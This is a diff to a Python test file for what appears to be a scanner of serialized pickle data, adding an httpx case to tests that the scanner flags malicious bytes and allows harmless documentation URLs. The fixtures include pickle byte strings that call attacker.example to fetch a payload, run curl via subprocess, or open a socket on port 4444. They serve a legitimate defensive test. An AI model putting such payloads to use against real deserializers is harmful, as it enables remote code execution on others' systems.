@@ -3064,6 +3064,7 @@ def test_scan_bytes_allows_benign_security_documentation_strings() -> None:
         "https://example.invalid/docs/os.system(command)",
         "https://example.invalid/api/subprocess.run(args)",
         "https://example.invalid/reference/requests.get(url)",
+        "https://example.invalid/reference/httpx.get(url)",
         "https://github.com/example/project/blob/main/loader.py",
     ],
 )
@@ -3080,6 +3081,7 @@ def test_scan_bytes_allows_inert_url_literals_with_executable_terms(literal: str
     [
         (b"curllib.request\nurlopen\n(Vhttps://attacker.example/payload\ntR.", "urllib.request.urlopen"),
         (b"crequests\nget\n(Vhttps://attacker.example/payload\ntR.", "requests.get"),
+        (b"chttpx\nget\n(Vhttps://attacker.example/payload\ntR.", "httpx.get"),
         (b"csocket\ncreate_connection\n(Vattacker.example\nI4444\ntR.", "socket.create_connection"),
         (b"csubprocess\nrun\n((Vcurl\nVhttps://attacker.example/payload\netR.", "subprocess.run"),
     ],
